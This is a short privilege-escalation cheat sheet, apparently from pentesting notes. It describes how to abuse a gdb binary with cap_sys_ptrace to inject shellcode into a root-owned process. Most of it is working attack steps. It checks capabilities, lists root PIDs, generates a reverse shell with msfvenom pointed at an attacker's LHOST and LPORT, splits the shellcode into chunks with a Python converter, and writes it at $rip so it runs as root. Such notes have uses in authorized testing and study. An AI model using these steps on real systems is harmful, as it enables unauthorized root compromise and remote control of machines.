# GDB cap_sys_ptrace Shellcode Injection

If `gdb` has `cap_sys_ptrace+ep`, it can attach to any running process (including root-owned ones) and write shellcode directly into its instruction stream.

**Verify capability:**
```bash
getcap /usr/bin/gdb
# /usr/bin/gdb = cap_sys_ptrace+ep
```

**Find a root process to attach to:**
```bash
ps auxww | grep root | grep -v "^\[" | awk '{print $1, $2, $11}'
```

**Generate reverse shell shellcode:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f py -v sc
# Use the byte array output to write a conversion script
```

**Convert shellcode to 8-byte little-endian chunks (Python):**
```python
import struct
sc = b"\x90\x90...<shellcode>..."
# pad to multiple of 8 with NOPs
while len(sc) % 8: sc = b"\x90" + sc
for i in range(0, len(sc), 8):
    chunk = sc[i:i+8]
    val = struct.unpack("<Q", chunk)[0]
    print(f"set {{long}}($rip+{i}) = {hex(val)}")
```

**Attach and inject:**
```bash
gdb -q -p <PID>
(gdb) set {long}($rip+0)  = 0x9090909090909090
(gdb) set {long}($rip+8)  = <chunk2>
# ... paste all chunks ...
(gdb) c    # continue execution → shellcode runs as root
```

If gdb hangs: `ctrl-z` then `kill -9 $(jobs -p)` and try another PID.
